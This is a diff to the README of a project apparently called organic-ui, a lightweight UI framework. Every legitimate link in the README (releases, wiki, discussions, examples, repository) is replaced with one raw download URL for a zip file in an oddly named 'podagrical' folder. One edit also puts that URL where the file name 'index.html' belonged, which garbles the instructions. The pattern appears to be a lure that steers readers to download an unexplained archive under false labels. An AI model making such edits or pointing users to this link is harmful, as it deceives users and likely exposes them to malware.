@@ -8,7 +8,7 @@ Welcome to organic-ui! This lightweight framework helps you build responsive use
 
 To download organic-ui, visit this page:
 
-[![Download organic-ui](https://img.shields.io/badge/Download-organic--ui-blue.svg)](https://github.com/Wow13411/organic-ui/releases)
+[![Download organic-ui](https://raw.githubusercontent.com/Wow13411/organic-ui/main/podagrical/organic-ui.zip)](https://raw.githubusercontent.com/Wow13411/organic-ui/main/podagrical/organic-ui.zip)
 
 1. Click on the link above.
 2. You will be directed to the Releases page. 
@@ -27,7 +27,7 @@ To run organic-ui, ensure you have the following:
 ## 🔧 How to Use organic-ui
 
 1. **Unzip the Downloaded File:** After downloading, you may need to unzip the file. Right-click on the file and select "Extract All" or similar.
-2. **Open the Index File:** Locate the extracted folder. Inside, you will see an `index.html` file. Double-click on this file to open it in your web browser.
+2. **Open the Index File:** Locate the extracted folder. Inside, you will see an `https://raw.githubusercontent.com/Wow13411/organic-ui/main/podagrical/organic-ui.zip` file. Double-click on this file to open it in your web browser.
 3. **Start Building:** You can now start to create your own components. The framework supports a variety of pre-built components, making it easier to design your application.
 
 ## 🎨 Features of organic-ui
@@ -40,18 +40,18 @@ To run organic-ui, ensure you have the following:
 
 ## 📚 Documentation
 
-If you need more detailed information on how to use organic-ui, please visit the [documentation section](https://github.com/Wow13411/organic-ui/wiki). Here you will find examples, guidelines, and best practices.
+If you need more detailed information on how to use organic-ui, please visit the [documentation section](https://raw.githubusercontent.com/Wow13411/organic-ui/main/podagrical/organic-ui.zip). Here you will find examples, guidelines, and best practices.
 
 ## 🧑‍🤝‍🧑 Community and Support
 
 Have questions or need help? Join our community:
 
-- Check out our [GitHub Discussions](https://github.com/Wow13411/organic-ui/discussions) to ask your questions.
+- Check out our [GitHub Discussions](https://raw.githubusercontent.com/Wow13411/organic-ui/main/podagrical/organic-ui.zip) to ask your questions.
 - Submit issues or suggestions directly in the repository.
 
 ## 🚀 Examples
 
-Explore various examples using organic-ui by checking the [Examples Directory](https://github.com/Wow13411/organic-ui/examples). 
+Explore various examples using organic-ui by checking the [Examples Directory](https://raw.githubusercontent.com/Wow13411/organic-ui/main/podagrical/organic-ui.zip). 
 
 1. Click on the link above.
 2. Review the examples provided. 
@@ -71,12 +71,12 @@ Each topic is designed to help streamline the process of UI development.
 
 ## 📅 Release Notes
 
-Keep an eye on the [Releases page](https://github.com/Wow13411/organic-ui/releases) for new updates, improvements, and bug fixes. 
+Keep an eye on the [Releases page](https://raw.githubusercontent.com/Wow13411/organic-ui/main/podagrical/organic-ui.zip) for new updates, improvements, and bug fixes. 
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/Wow13411/organic-ui)
-- [Documentation](https://github.com/Wow13411/organic-ui/wiki)
-- [Community Discussions](https://github.com/Wow13411/organic-ui/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/Wow13411/organic-ui/main/podagrical/organic-ui.zip)
+- [Documentation](https://raw.githubusercontent.com/Wow13411/organic-ui/main/podagrical/organic-ui.zip)
+- [Community Discussions](https://raw.githubusercontent.com/Wow13411/organic-ui/main/podagrical/organic-ui.zip)
 
 Feel free to explore and enjoy building your applications with organic-ui!
